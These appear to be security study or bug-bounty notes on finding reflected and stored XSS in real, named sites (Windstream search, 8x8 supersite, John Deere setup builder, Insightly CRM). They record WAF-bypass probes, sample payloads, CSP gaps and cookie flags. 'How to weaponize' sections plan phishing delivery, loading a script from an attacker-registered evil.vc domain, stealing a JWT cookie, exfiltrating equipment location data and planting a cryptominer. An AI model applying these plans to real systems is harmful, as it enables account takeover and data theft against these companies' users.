# Client-Side Injections Part II Notes

## Reflected & Stored XSS

### Reflected Attack Vectors




"Windstream net" most commonly refers to Windstream.net, which is the webmail service for Windstream customers, and is also the company's general internet service portal. Windstream is the parent telecommunications company, while Kinetic by Windstream is the brand name for its internet, phone, and TV services. 

Business to Business & Business to Customer

https://search.windstream.net/serp?q=rs0n&context=home (Multiple Places Being Rendered)
https://search.windstream.net/preferences?q=rs0n (Only 1 place being rendered, JSON Object)
- Authentication - NO (does not appear to have auth)
- WAF - YES - Cloudflare
    - https://search.windstream.net/serp?q=%3Cscript%3Ealert(1)%3C/script%3E&context=home
        - Removing script tags = no block
        - <>alert(1) = no block
        - <scruipt>alert(1) = no block
        - <img src=x onerror=alert(1)> = block
    - `/error_log` & `/wp-includes` = 403 Block
- Client-Side Validation - NO
- Output Encoding - YES
    - <title>&lt;rs0n&gt; - Windstream Web Search</title>
        - Typical
    - var session_payload = {"domain_key": "search_search.windstream.net_udog", "query": "\u003crs0n\u003e", "search_session_id": "mobxcksn3w6bdkpkz8dooa8v"};
        - Unicode
    - <a href="/serp?qc=images&amp;q=%3Crs0n%3E&amp;sc=xVZrh1F6zlST10">Images</a>
        - Hex
    - value="&lt;klsjdlkfjslkdjflksdjflkjsdlfkjsdf&gt;" (SEARCH BAR AT TOP)
        - Typical
    - <strong>No search results were found for &quot;&lt;klsjdlkfjslkdjflksdjflkjsdlfkjsdf&gt;&quot;</strong>
        - Typical
- Content Security Policy - NO (do not see one now, no headers in response to search)
- Notes
    - https://search.windstream.net/serp?q=rs0n&context=home&sc=rs0n
        - `sc` param = 400 response
- Victim
    - Who is the Victim?
        - Windstream users (single customer b2c)
        - Windstream users (company b2b)
        - Windstream employees/admins
    - How are we delivering the payload?
        - Payload in URL GET Parameter, delivered via Phishing
- How to weaponize
    - 







Unified Communication Platform: Whether it's voice calls, video conferencing, messaging, or collaboration tools, 8×8 brings all these functions together, creating a seamless experience for users.

Business to Business

https://supersite.8x8.com/8x8/Demo/login.php?destination=rs0n"
- Authentication - YES
- CSP 
    - default-src 'self'; 
        - Fallback - will be overwritten, highly restrictive
    - script-src *.vc *.8x8.com netutildevel.ddns.net 'unsafe-eval' 'unsafe-inline'; 
        - Inject inline javascript = execute
    - connect-src 'self'; 
        - Cannot exfil data w/ API Calls
    - img-src server.arcgisonline.com chart.googleapis.com 'self'; 
        - Cannot exfil to evil server
        - Can we register something on these domains?
    - style-src 'unsafe-inline' *.8x8.com netutildevel.ddns.net ;base-uri 'self';
        - May be able to execute XSS
        - Maybe exfil data w/ url()
    - form-action 'self' ; 
        - Cannot use forms to exfil data
    - object-src *.8x8.com netutildevel.ddns.net;
        -  
    - frame-src *.8x8.com *.vc  netutildevel.ddns.net; 
        - Can register *.vc
    - media-src *.8x8.com netutildevel.ddns.net; 
        - 
    - frame-ancestors *.8x8.com *.vc  netutildevel.ddns.net
        - 
- Output Encoding
    - `>` turns into `&gt;`
    - `"` does not get modified/encoded, however it does not get processed in the DOM as well
- CSRF - 
- Cookie Flags
    - PHPSESSID=i189tta2o3u6jggclrugfejud3
        - httpOnly
- Victim
    - Who is the Victim?
        - Someone who has a valid account for supersite.8x8.com
        - Ideally has higher priviledges than free account (if you can get a free account)
    - How are we delivering the payload?
        - Payload in URL GET Parameter, delivered via Phishing
- How to weaponize
    - Register malicious .vc site
    - Host malicious script on *.vc
    - <script src="evil.vc/exploit.js">
    - Complex JS file -> Gather data leveraging victim's session
        - Overwite `Document.body` w/ Loading Screen
        - HTTP Requests fuzz for endpoints/valid responses
        - Setup database and API
        - As HTTP requests get valid responses, full response sent to my db/API
    - Exfil data through gaps in CSP


### Stored Attack Vectors

https://setup-builder.deere.com/
- Client-Side Validation
    - rs0n<> = `Please remove invalid characters: <, >`
    - 
- Cookie Flags
    - `/session`
        - jwt-external-access-token
            - Might be used to form idx cookie for oauth
            - no httpOnly
        - client
            - Used in larger session validation flow
            - httpOnly
    - `https://signin.johndeere.com/api/v1/sessions/me`
        - idx
            - httpOnly
- Content Security Policy (CSP) 
    - base-uri 'self';

    - connect-src 'self' http://s3.amazonaws.com/grower-ops-translations/ https://s3.amazonaws.com/grower-ops-translations/ http://s3.amazonaws.com/grower-ops-translations-prod/ https://s3.amazonaws.com/grower-ops-translations-prod/ *.google-analytics.com https://assets.adobedtm.com https://edge.adobedc.net somni.deere.com https://adobedc.demdex.net https://icons-cdn.deere.com https://translations-cdn.deere.com *.johndeere.com *.deere.com ws://localhost:* http://localhost:* https://*.browser-intake-datadoghq.com https://browser-intake-datadoghq.com *.googleapis.com *.deere.com:*;
    - default-src 'self' *.gstatic.com *.googleapis.com;
    - font-src 'self' data: https://cdn.ux.deere.com fonts.gstatic.com;
    - frame-ancestors 'self' *.deere.com:* *.johndeerecloud.com *.johndeere.com;
    - frame-src 'self' *.deere.com:* *.johndeerecloud.com *.johndeere.com http://setup-builder.deere.com;
    - img-src * data:;
    - manifest-src https://cdn.ux.deere.com;
    - script-src 'self' 'unsafe-inline' 'unsafe-eval' *.googleapis.com google-analytics.com https://assets.adobedtm.com https://edge.adobedc.net somni.deere.com https://adobedc.demdex.net *.deere.com *.johndeerecloud.com http://localhost:* *.googleapis.com;
    - style-src 'self' 'unsafe-inline' *.googleapis.com http://localhost:*;
    - worker-src 'self'
- Server-Side Validation
    - "fileName":"rs0n<>.zip" = `<>` stripped from name before stored in DB
- Output Encoding
    - Virtual DOM w/ React
- Who is the victim?
    - Has a valid account
    - *Farmer, Farm Operator, Equipment Manager, etc.
        - RBAC: Staff Member, Operator, Partner Organization, Dealer
    - They have higher permissions then our account 
- How is the payload delivered?
    - Typical use of application
    - Victim will navigate to page where payload is rendered in the DOM
- How is the attack vector weaponized?
    - Host a complex script
        - Steal the jwt-external-access-token cookie
        - Modify existing data or settings
        - Exfil data about specific farm equipment settings, especially location
        - Cryptominer









https://crm.na1.insightly.com
- Client-Side Validation
    - No. of Employees: rs0n = `This value must be a number between -2147483648 and 2147483647`
- Server-Side Validation
    - No. of Employees: rs0n = same as client-side validation
- Content Security Policy (CSP)
    - `/home` frame-ancestors https://*.insightly.com 'self'
- CSRF
    - __RequestVerificationToken - httpOnly
- Cookie Flags
    - InsightlyApps (session token) - httpOnly







## DOM-Based XSS & CSPP

